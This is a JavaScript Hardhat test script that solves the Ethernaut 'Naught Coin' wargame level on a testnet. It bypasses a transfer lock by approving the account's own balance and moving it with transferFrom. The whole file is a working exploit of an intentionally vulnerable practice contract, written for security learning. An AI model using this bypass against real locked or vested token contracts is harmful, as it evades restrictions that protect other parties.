// npx hardhat test ./test/15_naught_coin.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "NaughtCoin";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._15_naught_coin, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    const accounts = await ethers.getSigners();
    let balance = await levelContract.balanceOf(accounts[0].address);
    console.log(`balance = ${balance}`);
    let tx = await levelContract.approve(accounts[0].address, balance);
    await tx.wait();
    tx = await levelContract.transferFrom(accounts[0].address, accounts[1].address, balance)
    //tx = await levelContract.transferFrom(accounts[0].address, accounts[1].address, balance, { gasLimit: 500000 })
    await tx.wait();

    //console.log(tx);
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});